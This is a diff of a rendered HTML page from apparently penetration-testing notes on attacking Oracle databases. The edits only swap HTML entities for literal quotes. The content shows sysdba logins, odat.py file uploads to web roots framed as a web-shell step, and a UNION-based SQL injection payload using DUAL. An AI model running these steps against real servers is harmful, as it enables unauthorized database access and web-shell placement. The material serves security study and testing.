@@ -27012,7 +27012,7 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 </span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4"></a><span class="go">sqlplus &lt;username&gt;/&lt;password&gt;@$ip/XE as sysdba</span>
 </span></code></pre></div></td></tr></table></div>
 <p>In case of this error message ( sqlplus: error while loading shared libraries: libsqlplus.so: cannot open shared object file: No such file or directory), there might be an issue with libraries. Possible solution:</p>
-<div class="language-shell-session highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-4-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1"></a><span class="go">sudo sh -c &quot;echo /usr/lib/oracle/12.2/client64/lib &gt; /etc/ld.so.conf.d/oracle-instantclient.conf&quot;;sudo ldconfig</span>
+<div class="language-shell-session highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-4-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1"></a><span class="go">sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib &gt; /etc/ld.so.conf.d/oracle-instantclient.conf";sudo ldconfig</span>
 </span></code></pre></div></td></tr></table></div>
 <p>The System Database Admin  in an Oracle RDBMS is <strong>sysdba</strong>. If an user has more privileges that they should have we can try to exploit it as sysdba.</p>
 <div class="language-shell-session highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-5-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1"></a><span class="go">sqlplus &lt;user&gt;/&lt;password&gt;@$ip/XE as sysdba</span>
@@ -27045,7 +27045,7 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 <span class="normal"><a href="#__codelineno-6-6">6</a></span>
 <span class="normal"><a href="#__codelineno-6-7">7</a></span>
 <span class="normal"><a href="#__codelineno-6-8">8</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1"></a><span class="c1"># 1. Create a non suspicious web shell </span>
-</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2"></a><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;Oracle File Upload Test&quot;</span><span class="w"> </span>&gt;<span class="w"> </span>testing.txt
+</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2"></a><span class="nb">echo</span><span class="w"> </span><span class="s2">"Oracle File Upload Test"</span><span class="w"> </span>&gt;<span class="w"> </span>testing.txt
 </span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3"></a>
 </span><span id="__span-6-4"><a id="__codelineno-6-4" name="__codelineno-6-4"></a><span class="c1"># 2. Upload  the shell to linux (/var/www/html) or windows (C:\\inetpub\\wwwroot):</span>
 </span><span id="__span-6-5"><a id="__codelineno-6-5" name="__codelineno-6-5"></a>./odat.py<span class="w"> </span>utlfile<span class="w"> </span>-s<span class="w"> </span><span class="nv">$ip</span><span class="w"> </span>-d<span class="w"> </span>XE<span class="w"> </span>-U<span class="w"> </span>&lt;user&gt;<span class="w"> </span>-P<span class="w"> </span>&lt;password&gt;<span class="w"> </span>--sysdba<span class="w"> </span>--putFile<span class="w"> </span>C:<span class="se">\\</span>inetpub<span class="se">\\</span>wwwroot<span class="w"> </span>testing.txt<span class="w"> </span>./testing.txt
@@ -27086,7 +27086,7 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 </span><span id="__span-7-13"><a id="__codelineno-7-13" name="__codelineno-7-13"></a>
 </span><span id="__span-7-14"><a id="__codelineno-7-14" name="__codelineno-7-14"></a><span class="gp">    #</span><span class="c1"># 3. upload a web shell to the target. This requires the server to run a web server, and we need to know the exact location of the root directory for the webserver.</span>
 </span><span id="__span-7-15"><a id="__codelineno-7-15" name="__codelineno-7-15"></a><span class="gp">    #</span><span class="c1"># 1. Creating a non suspicious web shell </span>
-</span><span id="__span-7-16"><a id="__codelineno-7-16" name="__codelineno-7-16"></a><span class="go">echo &quot;Oracle File Upload Test&quot; &gt; testing.txt</span>
+</span><span id="__span-7-16"><a id="__codelineno-7-16" name="__codelineno-7-16"></a><span class="go">echo "Oracle File Upload Test" &gt; testing.txt</span>
 </span><span id="__span-7-17"><a id="__codelineno-7-17" name="__codelineno-7-17"></a><span class="gp">    #</span><span class="c1"># 2. Uploading the shell to linux (/var/www/html) or windows (C:\\inetpub\\wwwroot):</span>
 </span><span id="__span-7-18"><a id="__codelineno-7-18" name="__codelineno-7-18"></a><span class="go">./odat.py utlfile -s $ip -d XE -U &lt;user&gt; -P &lt;password&gt; --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt</span>
 </span></code></pre></div></td></tr></table></div>
@@ -27279,7 +27279,7 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 </table>
 <h2 id="extra-bonus-dual">Extra Bonus: DUAL</h2>
 <p>The DUAL is a special one row, one column table present by default in all Oracle databases. The owner of DUAL is SYS, but DUAL can be accessed by every user. This is a possible payload for SQLi:</p>
-<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-10-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1"></a>&#39;+UNION+SELECT+NULL+FROM+dual--
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-10-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1"></a>'+UNION+SELECT+NULL+FROM+dual--
 </span></code></pre></div></td></tr></table></div>
 <p>Oracle syntax requires the use of FROM, but some queries don't requires any table. For these case we use DUAL. Also Oracle doesn't allow the queries that employ information_schema.tables.</p>
 
